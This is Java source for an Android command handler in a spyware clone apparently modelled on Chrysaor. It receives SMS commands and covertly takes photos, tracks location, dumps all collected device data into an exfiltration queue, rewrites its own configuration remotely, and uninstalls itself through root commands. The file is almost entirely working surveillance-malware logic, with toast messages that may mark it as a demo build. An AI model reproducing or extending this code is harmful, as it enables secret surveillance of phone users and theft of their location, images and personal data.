package com.android.chrysaoralike;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import android.widget.Toast;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CommandHandler {
    private static final String TAG = "CommandHandler";
    private Context context;
    private DataCollector dataCollector;
    private String adminChatId;
    private boolean isUpgrading = false, isRemoving = false, isRoaming = false, allowRoaming = false;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    public CommandHandler(Context context) {
        this.context = context.getApplicationContext();
        this.dataCollector = new DataCollector(context);
        SharedPreferences prefs = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE);
        this.adminChatId = prefs.getString("admin_chat_id", "admin");
        this.isUpgrading = prefs.getBoolean("is_upgrading", false);
        this.isRemoving = prefs.getBoolean("is_removing", false);
        this.isRoaming = prefs.getBoolean("is_roaming", false);
        this.allowRoaming = prefs.getBoolean("allow_roaming_http", true);
        Log.i(TAG, "CommandHandler initialized.");
    }

    public void execute(SmsCommand cmd, String chatId) {
        if (isUpgrading && cmd.commandId != 8) { Log.w(TAG, "Blocked: upgrading"); return; }
        if (isRemoving) { Log.w(TAG, "Blocked: removing"); return; }
        if (isRoaming && !allowRoaming) { Log.w(TAG, "Blocked: roaming"); return; }
        Log.i(TAG, "Executing command: " + cmd.commandId);

        switch (cmd.commandId) {
            case 0: // KILL
                Log.i(TAG, "KILL triggered!");
                showToast("Self-destruct triggered!");
                executor.execute(() -> {
                    String result = RootUtils.runCommand("pm uninstall " + context.getPackageName());
                    Log.i(TAG, "Uninstall result: " + result);
                });
                break;

            case 1: // LOCATE
                Log.i(TAG, "LOCATE triggered!");
                showToast("Getting location...");
                executor.execute(() -> {
                    LocationGetter loc = new LocationGetter(context);
                    String location = loc.getLocationString();
                    DataQueue.getInstance().addPart("location.txt", location.getBytes(), false);
                    Log.i(TAG, "Location: " + location);
                });
                break;

            case 3: // SET
                Log.i(TAG, "SET triggered! Args: " + cmd.args);
                showToast("Updating config...");
                String[] pairs = cmd.args.split("&");
                SharedPreferences.Editor editor = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).edit();
                for (String pair : pairs) {
                    String[] kv = pair.split("=", 2);
                    if (kv.length == 2) {
                        editor.putString(kv[0], kv[1]);
                        Log.i(TAG, "Set " + kv[0] + " = " + kv[1]);
                    }
                }
                editor.apply();
                break;

            case 4: // CAMERA
                Log.i(TAG, "CAMERA triggered!");
                showToast("Taking photo...");
                executor.execute(() -> {
                    byte[] photo = dataCollector.takePhoto();
                    if (photo != null) {
                        DataQueue.getInstance().addPart("photo.jpg", photo, true);
                        Log.i(TAG, "Photo captured (" + photo.length + " bytes)");
                    } else {
                        Log.e(TAG, "Photo capture failed.");
                    }
                });
                break;

            case 5: // EXECUTE
                Log.i(TAG, "EXECUTE triggered!");
                showToast("Collecting data...");
                executor.execute(() -> {
                    String allData = dataCollector.collectAllData();
                    if (allData != null && !allData.isEmpty()) {
                        DataQueue.getInstance().addPart("full_dump.jigglypuff_mail", allData.getBytes(), false);
                        Log.i(TAG, "Data collected (" + allData.length() + " bytes)");
                    }
                });
                break;
            default:
                Log.w(TAG, "Unknown command: " + cmd.commandId);
                showToast("Unknown command");
                break;
        }
    }
    private void showToast(String msg) {
        android.os.Handler mainHandler = new android.os.Handler(context.getMainLooper());
        mainHandler.post(() -> Toast.makeText(context, "Chrysaor: " + msg, Toast.LENGTH_LONG).show());
    }

    // Setters
    public void setUpgrading(boolean b) { this.isUpgrading = b; }
    public void setRemoving(boolean b) { this.isRemoving = b; }
    public void setRoaming(boolean b) { this.isRoaming = b; }
    public void setAllowRoaming(boolean b) { this.allowRoaming = b; }
    public void setAdminChatId(String id) { this.adminChatId = id; }
}